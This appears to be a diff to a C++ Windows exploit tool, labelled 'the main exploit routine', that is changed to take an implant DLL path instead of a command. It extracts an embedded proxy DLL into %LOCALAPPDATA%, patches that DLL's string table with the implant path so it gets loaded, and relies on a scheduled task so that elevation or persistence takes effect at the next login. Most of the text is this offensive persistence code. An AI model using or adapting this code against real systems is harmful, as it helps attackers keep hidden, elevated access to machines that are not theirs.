@@ -98,7 +98,7 @@ bool ExtractResource(int iId, LPWSTR pDest)
 /* the main exploit routine */
 int main(int argc, char* argv[])
 {
-	LPWSTR pCMDpath;
+	LPWSTR pDLLpath;
 	size_t sSize = 0;
 	BOOL bResult;
 	DWORD dwErrorCode = 0;
@@ -111,9 +111,9 @@ int main(int argc, char* argv[])
 		printf("[!] Error, you must supply a path to a DLL to persist e.g. c:\\Users\\YourUser\\AppData\\Local\\Temp\\Implant.dll\n");
 		return EXIT_FAILURE;
 	}
-	// multi-byte string to wide char string to convert user command into pCMD
-	pCMDpath = new TCHAR[MAX_PATH + 1];
-	mbstowcs_s(&sSize, pCMDpath, MAX_PATH, argv[1], strlen(argv[1]));
+	// multi-byte string to wide char string to convert user command into pDLL
+	pDLLpath = new TCHAR[MAX_PATH + 1];
+	mbstowcs_s(&sSize, pDLLpath, MAX_PATH, argv[1], strlen(argv[1]));
 	// locate %LOCALAPPDATA% environment variable
 	LPWSTR pAppPath = new WCHAR[MAX_ENV_SIZE];
 	GetEnvironmentVariable(L"LOCALAPPDATA", pAppPath, MAX_ENV_SIZE);
@@ -130,7 +130,7 @@ int main(int argc, char* argv[])
 		if (ExtractResource(IDR_DLLPROXY, pBinPatchPath))
 		{
 			// string table structure creation hack using wstring's for user command
-			wstring data[7] = { L"", L"", L"", L"", L"", (wstring)pCMDpath, L"" };
+			wstring data[7] = { L"", L"", L"", L"", L"", (wstring)pDLLpath, L"" };
 			vector< WORD > buffer;
 			for (size_t index = 0; index < sizeof(data) / sizeof(data[0]); index++)
 			{
@@ -141,7 +141,7 @@ int main(int argc, char* argv[])
 			}
 			// do not delete the existing resource entries
 			HANDLE hPE = BeginUpdateResource(pBinPatchPath, false);
-			// overwrite the IDS_CMD101 string table in the payload DLL with user command.
+			// overwrite the IDS_DLL101 string table in the payload DLL to LoadModule()
 			bResult = UpdateResource(hPE, RT_STRING, MAKEINTRESOURCE(7), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), reinterpret_cast<void*>(&buffer[0]), buffer.size() * sizeof(WORD));
 			bResult = EndUpdateResource(hPE, FALSE);
 			// executes the scheduled task by name, note that this won't usually work as the elevation/persistence will occur on next login.
